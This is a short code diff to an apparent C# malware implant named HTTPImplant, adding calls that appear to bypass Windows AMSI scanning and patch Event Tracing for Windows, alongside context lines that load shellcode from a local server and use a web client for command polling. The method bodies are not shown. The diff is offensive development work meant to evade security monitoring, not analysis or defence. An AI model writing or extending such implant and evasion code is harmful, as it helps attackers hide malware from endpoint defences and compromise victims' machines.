@@ -27,6 +27,14 @@ namespace HTTPImplant
             string implantId = Environment.MachineName;
             string lastCommandExecuted = string.Empty;
 
+            MemEncrypt.ReadMem();
+
+            AmsiHBP.Start();
+
+            EtwPatch.Start();
+
+            Environment.Exit(0);
+
             TestStomper("localhost", "8000", "calc64.bin");
 
             using (WebClient webClient = new WebClient())
